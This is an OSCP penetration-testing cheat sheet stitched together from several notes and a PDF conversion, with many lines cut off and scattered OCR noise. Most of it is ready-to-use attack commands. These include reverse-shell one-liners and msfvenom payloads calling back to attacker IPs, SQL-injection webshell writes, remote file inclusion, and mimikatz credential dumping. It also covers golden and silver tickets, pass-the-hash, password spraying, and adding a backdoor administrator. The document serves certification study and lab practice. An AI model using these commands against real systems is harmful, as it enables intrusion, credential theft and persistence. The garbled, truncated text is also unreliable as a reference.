    - tar.bz2
        - uncompress
            > tar -xvf archive.tar.gz2
    - gz
        - uncompress
            > gzip -d file.gz
    - zip
        - unzip
            > unzip file.zip
    - tar.xz
        - uncompress
            > tar -xf newfiletocreate.tar.xz
    - rar
        - unrar
            > unrar e thefile.rar
- Run a command as another user
    - runas (need to be root)
        > runas -l username -c '/bin/bash'
    - sudo
        > sudo -u username /bin/bash
- seach apt database for packages
    > sudo apt update
    > sudo apt-cache search <string>

## Compile:
    - Compile C code on linux box
        > gcc -pthread code.c -o code -lcrypt
        > file code
        > chmod +x code
    - Compile C code into 32bit
        > gcc -m32 evil.c -o evil

## Windows Misc commands:

- Add to windows path variable


C:\Users\tony\Desktop>echo %PATH%
echo %PATH%
C:\Users\tony\AppData\Local\Microsoft\WindowsApps;

C:\Users\tony\Desktop>path C:\Users\tony\AppData\Local\Microsoft\WindowsApps;C:\Windows\system32
path C:\Users\tony\AppData\Local\Microsoft\WindowsApps;C:\Windows\system32

- Show windows version

Windows 10 (1903)       10.0.18362
Windows 10 (1809)       10.0.17763
Windows 10 (1803)       10.0.17134
Windows 10 (1709)       10.0.16299
Windows 10 (1703)       10.0.15063
Windows 10 (1607)       10.0.14393
Windows 10 (1511)       10.0.10586
Windows 10              10.0.10240

Windows 8.1 (Update 1)  6.3.9600
Windows 8.1             6.3.9200
Windows 8               6.2.9200

Windows 7 SP1           6.1.7601
Windows 7               6.1.7600

Windows Vista SP2       6.0.6002
Windows Vista SP1       6.0.6001
Windows Vista           6.0.6000

Windows XP2             5.1.26003

# Exploit exersies outside of OSCP lab:
--------------------------------------
## buffer overflow attacks:
    - dostackbufferoverflowgood
        - https://github.com/justinsteven/dostackbufferoverflowgood
    - brianpan
        - https://www.vulnhub.com/series/brainpan,32/

## Hack the box
    - https://www.hackthebox.eu/

## Vulnhub
    - https://www.vulnhub.com/
        - Nebula
        - Brainpan

## Exploit Exercises:
    - https://exploit-exercises.lains.space/


   
9/27/23, 11:00 AMOSCP Cheatsheet
OSCP Cheatsheet
OSCP Cheatsheet
¢ | prepared this cheatsheet as part of my OSCP preperation.
¢ I'll keep this updating.
¢ For any suggestions mail me contact.saisathvik@gmail.com
I prepared this cheatsheet as part of my OSCP preperation.
I'll keep this updating.
For any suggestions mail me contact.saisathvik@gmail.com
S@eGUl
Table of Content
Tapie ot Content
¢ General
© Important Locations
© File Transfers
= Windows to Kali
General
Important Locations
File Transfers
Windows to Kali
© Adding Users
= Windows
= uinux
Adding Users
Windows
Linux
© Password-Hash Cracking
= fcrackzip
= John
~ ashcat
Password-Hash Cracking
fcrackzip
John
Hashcat
https://md2pdfnetlify.app
Mimikatz
Ligolo-ng
Recon and Enumeration
Port Scanning
FTP enumeration
SSH enumeration
SMB enumeration
HTTP/S enumeration
Wordpress
Drupal
Joomla
DNS enumeration
SMTP enumeration
LDAP Enumeration
NFS Enumeration
SNMP Enumeration
RPC Enumeration
Web Attacks
Directory Traversal
Local File Inclusion
SQL Injection
Exploitation
Reverse Shells
Msfvenom
One Liners
Groovy reverse-shell
Windows Privilege Escalation
Basic
Automated Scripts
Token Impersonation
Services
Binary Hijacking
Unquoted Service Path
Insecure Service Executables
Weak Registry permissions
DLL Hijacking
Autorun
AlwaysInstallElevated
Schedules Tasks
Startup Apps
Insecure GUI apps
Passwords
Sensitive files
Config files
Registry
RunAs - Savedcreds
Pass the Hash
Linux Privilege Escalation
TTY Shell
Basic
Automated Scripts
Sensitive Information
Sudo/SUID/Capabilities
Cron Jobs
NFS
Post Exploitation
Sensitive Information
Powershell History
Searching for passwords
Searching in Registry for Passwords
KDBX Files
Dumping Hashes
Active Directory Pentesting
Enumeration
Powerview
Bloodhound
PsLoggedon
Attacking Active Directory Authentication
Password Spraying
AS-REP Roasting
Kerberoasting
Silver Tickets
Secretsdump
Lateral Movement in Active Directory
psexec - smbexec - wmiexec - atexec
winrs
crackmapexec
Pass the ticket
Golden Ticket
General
Important Locations
Windows

File Transfers
Downloading on Windows
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\tem
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
Downloading on Linux
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
Windows to Kali
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharenameAdding Users
Windows
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
Linux
adduser <uname> #Interactive
useradd <uname>
useradd -u <UID> -g <group> <uname> #UID can be something new than existing, this comman
Password-Hash Cracking
Hash Analyzer: https://www.tunnelsup.com/hash-analyzer/
fcrackzip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
John
https://github.com/openwall/john/tree/bleeding-jumbo/run
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt
Hashcat
https://hashcat.net/wiki/doku.php?id=example_hashes
#Obtain the Hash module number
hashcat -m <number> hash wordlists.txt --forceMimikatz
privilege::debug
sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::lsa /patch #both these dump SAM
#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
Ligolo-ng
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
#Kali machine - Attacker machine
./proxy -laddr <LHOST>:9001 -selfcert
#windows or linux machine - compromised machine
./agent -connect <LHOST>:9001 -ignore-cert
#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface
#Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo
Recon and Enumeration
OSINT OR Passive Recon
💡 Not that useful for OSCP as we’ll be dealing with internal machines
whois: whois <domain> or whois <domain> -h <IP>
Google dorking,site
filetype
intitle
GHDB - Google hacking database
OS and Service Information using searchdns.netcraft.com
Github dorking
filename
user
A tool called Gitleaks for automated enumeration
Shodan dorks
hostname
port
Then gather infor by going through the options
Scanning Security headers and SSL/TLS using https://securityheaders.com/
Port Scanning
#use -Pn option if you're getting nothing in scan
nmap -sC -sV <IP> -v #Basic scan
nmap -T4 -A -p- <IP> -v #complete scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124 #running vuln category scripts
#NSE
updatedb
locate .nse | grep <name>
sudo nmap --script="name" <IP> #here we can specify other options like specific ports...e
Test-NetConnection -Port <port> <IP> #powershell utility
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is
FTP enumeration
ftp <IP>
#login if you have relevant creds or based on nmpa scan find out whether this has anonymo
put <file> #uploading file
get <file> #downloading file
#NSElocate .nse | grep ftp
nmap -p21 --script=<name> <IP>
#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username
#check for vulnerabilities associated with the version identified.
SSH enumeration
#Login
ssh uname@IP #enter password in the prompt
#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John
#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and
#check for vulnerabilities associated with the version identified.
SMB enumeration
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP
#In windows we can view like this
net view \\<computername/IP> /all

HTTP/S enumeration
View source-code and identify any hidden content. If some image looks suspicious download and
try to find hidden data in it.
Identify the version or CMS and check for active exploits. This can be done using Nmap and
Wappalyzer.
check /robots.txt folder
Look for the hostname and add the relevant one to /etc/hosts file.
Directory and file discovery - Obtain any hidden files which may contain juicy information
dirbuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
Vulnerability Scanning using nikto: nikto -h <url>SSL certificate inspection, this may reveal information like subdomains, usernames…etc
Default credentials, Identify the CMS or service ans check for default credentials and test them
out.
Bruteforce
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^
# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do
#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
if cgi-bin is present then do further fuzzing and obtain files like .sh or .pl
Check if other services like FTP/SMB or anyothers which has upload privileges are getting
reflected on web.
API - Fuzz further and it can reveal some sensitive information
#identifying endpoints using gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
If there is any Input field check for Remote Code execution or SQL Injection
Check the URL, whether we can leverage Local or Remote File Inclusion.
Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
Wordpress
# basic usage
wpscan --url "target" --verbose
# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.
# Add Wpscan API to get the details of vulnerabilties.
Drupal
droopescan scan drupal -u http://siteJoomla
droopescan scan joomla --url http://site
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://gith
DNS enumeration
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash brutef
dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list
dnsenum megacorpone.com
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #we're querying with a specific IP
SMTP enumeration
nc -nv <IP> 25 #Version Detection
smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, VRFY, EXP
#Sending email with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t user1@test.com -t user2@test.com --from user3@test.com --server <mailserver
LDAP Enumeration
#for computers
python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --computers
#for groups
python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --groups
#for users
python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --da
#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u $user -p <password> --privileged-use
NFS Enumeration
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
SNMP Enumeration
snmpcheck -t <IP> -c public
snmpwalk -c public -v1 -t 10 <IP>
snmpenum -t <IP>
RPC Enumeration
rpcclient -U=user $DCIP
rpcclient -U="" $DCIP #Anonymous login
##Commands within in RPCclient
srvinfo
enumdomusers #users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <user> #SID of specified user
createdomuser $user #Creating a user
deletedomuser $user
enumdomains
enumdomgroups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all usersnetshareenum #Share enumeration, this only comesup if the current user we're logged in ha
netshareenumall
lsaenumsid #SID of all users
Web Attacks
💡 Cross-platform PHP revershell: https://github.com/ivan-sincek/php-reverse-
shell/blob/master/src/reverse/php_reverse_shell.php
Directory Traversal
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path
# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd
#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/pas
#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/instal
URL Encoding
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
Wordpress
Simple exploit: https://github.com/leonjza/wordpress-shell
Local File Inclusion
Main difference between Directory traversal and this attack is, here we’re able to execute
commands remotely.#At first we need
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.lo
#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #en
#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode
Remote file inclusion
1. Obtain a php shell
2. host a file server
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&
we can also host a php reverseshell and obtain shell.
SQL Injection
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-Blind SQL Injection - This can be identified by Time-based SQLI
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
Manual Code Execution
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';
#Sometimes we may not have direct access to convert it to RCE from web, then follow below
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
SQLMap - Automated Code execution
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
#OS Shell
# Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp" #/var/www/html/tmp
Exploitation
Reverse Shells
Msfvenom
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exemsfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
One Liners
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conn
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
#For powershell use the encrypted tool that's in Tools folder
💡 While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-
shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-
shell/blob/master/src/reverse/php_reverse_shell.php)
Groovy reverse-shell
For Jenkins
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(h
Windows Privilege Escalation
Basic
#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>
#Powershell History
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHostAutomated Scripts
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
Token Impersonation
Command to check whoami /priv
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"
#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a
#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoam
#writes whoami command to w.log file
Services
Binary Hijacking
#Identify service from winpeas
icalcs "path" #F means full permission, we need to check we have full access on folder
sc qc <servicename> #find binarypath variable
sc config <service> <option>="<value>" #change the path to the reverseshell location
sc start <servicename>
Unquoted Service Pathwmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ #Displ
#Check the Writable path
icalcs "path"
#Insert the payload in writable location and which works.
sc start <servicename>
Insecure Service Executables
#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
sc start <service>
Weak Registry permissions
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means
accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
#Service Information from regedit, identify the variable which holds the executable
reg query <reg-path>
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:
#Imagepath is the variable here
net start <service>
DLL Hijacking
Autorun
#For checking, it will display some information with file-location
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
#Check the location is writableaccesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
#Replace the executable with the reverseshell and we need to wait till Admin logins, then
AlwaysInstallElevated
#For checking, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f m
#Execute and get shell
msiexec /quiet /qn /i reverse.msi
Schedules Tasks
schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
#Permission check - Writable means exploitable!
icalcs "path"
#Wait till the scheduled task in executed, then we'll get a shell
Startup Apps
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be
#Check writable permissions and transfer
#The only catch here is the system needs to be restarted
Insecure GUI apps
#Check the applications that are running from "TaskManager" and obtain list of applicatio
#Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe
PasswordsSensitive files
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
Findstr /si password *.config
findstr /si pass/pwd *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
in all files
findstr /spin "password" *.*
findstr /spin "password" *.*
Config files
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
### VNCreg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
### Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "D
### SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
### Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
### Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
RunAs - Savedcreds
cmdkey /list #Displays stored credentials, looks for any optential users
#Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
Pass the Hash
#If hashes are obtained though some means then use psexec, smbexec and obtain the shell a
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe
Linux Privilege Escalation
TTY Shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'Basic
find / -writable -type d 2>/dev/null
dpkg -l #Installed applications on debian system
cat /etc/fstab #Listing mounted drives
lsblk #Listing all available drives
lsmod #Listing loaded drivers
Automated Scripts
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
Sensitive Information
cat .bashrc
env #checking environment variables
watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
Sudo/SUID/Capabilities
💡 GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
Cron Jobs
#Detecting Cronjobs
cat /etc/crontab
crontab -lpspy #handy tool to livemonitor stuff happening in Linux
NFS
##Mountable shares
cat /etc/exports #On target
showmount -e <target IP> #On attacker
###Check for "no_root_squash" in the output of shares
mount -o rw <targetIP>:<share-location> <directory path we created>
#Now create a binary there
chmod +x <binary>
Post Exploitation
This is more windows specific as exam specific.
💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user
and we can open several files, gives some edge!
Sensitive Information
Powershell History
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_hi
#Example
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost
Searching for passwords
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
Searching in Registry for Passwordsreg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
💡 Always check documents folders, i may contain some juicy files
KDBX Files
#These are KeyPassX password stored files
cmd> dir /s /b *.kdbx
Ps> Get-ChildItem -Recurse -Filter *.kdbx
#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
Dumping Hashes
1. Mimikatz
2. If this is a domain joined machine, then follow Post-exp steps for AD.
Active Directory Pentesting
Enumeration
To check local administrators in domain joined machine
net localgroup Administrators
Powerview
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then chang
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-N
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domainFind-LocalAdminAccess # scans the network in an attempt to determine if our current user
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSessi
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in d
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(secur
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name
# Checking for "GenericAll" right for a specific group, after obtaining they can be conve
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | se
Find-DomainShare #find the shares in the domain
Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
Bloodhound
Collection methods - database
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name"
# Bloodhound-Python
bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will b
Running Bloodhound
sudo neo4j console
# then upload the .json files obtained
PsLoggedon
# To see user logons at remote system of a domain(external tool)
.\PsLoggedon.exe \\<computername>
Attacking Active Directory Authentication
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if
we don’t have proper creds.Password Spraying
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success
# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
AS-REP Roasting
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the has
.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
Silver Tickets
Obtaining hash of an SPN user using Mimikatz
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
Obtaining Domain SID
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-198737
Forging silver ticket Ft Mimikatz
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain
exit# we can check the tickets by,
ps> klist
Accessing service
ps> iwr -UseDefaultCredentials <servicename>://<computername>
Secretsdump
secretsdump.py <domain>/<user>:<password>@<IP>
Lateral Movement in Active Directory
psexec - smbexec - wmiexec - atexec
Here we can pass the credentials or even hash, depending on what we have
psexec.py <domain>/<user>:<password1>@<IP>
# the user should have write access to Admin share then only we can get sesssion
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <doma
#we passed full hash here
smbexec.py <domain>/<user>:<password1>@<IP>
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <dom
#we passed full hash here
wmiexec.py <domain>/<user>:<password1>@<IP>
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <dom
#we passed full hash here
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <doma
#we passed full hash here
winrs
winrs -r:<computername> -u:<user> -p:<password> "command"
# run this and check whether the user has access on the machine, if you have access then# run this on windows session
crackmapexec
If stuck make use of Wiki
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Brutef
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success #Password
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provid
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing comman
#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug
Pass the ticket
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
Golden Ticket
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-235
misc::cmd
klist
dir \\<RHOST>\admin$

Windows - Privilege Escalation

Summary
Tools
Windows Version and Configuration
User Enumeration
Network Enumeration
Antivirus Enumeration

Default Writeable Folders
EoP - Looting for passwords
SAM and SYSTEM files
HiveNightmare
LAPS Settings
Search for file contents
Search for a file with a certain filename
Search the registry for key names and passwords
Passwords in unattend.xml
Wifi passwords
Sticky Notes passwords
Passwords stored in services
Passwords stored in Key Manager
Powershell History
Powershell Transcript
Password in Alternate Data Stream
EoP - Processes Enumeration and Tasks
EoP - Incorrect permissions in services
EoP - Windows Subsystem for Linux (WSL)
EoP - Unquoted Service Paths
EoP - $PATH Interception
EoP - Named Pipes
EoP - Kernel Exploitation
EoP - AlwaysInstallElevated
EoP - Insecure GUI apps
EoP - Evaluating Vulnerable Drivers
EoP - Printers
Universal Printer
Bring Your Own Vulnerability
EoP - Runas
EoP - Abusing Shadow Copies
EoP - From local administrator to NT SYSTEM
EoP - Living Off The Land Binaries and Scripts
EoP - Impersonation Privileges
Restore A Service Account's Privileges

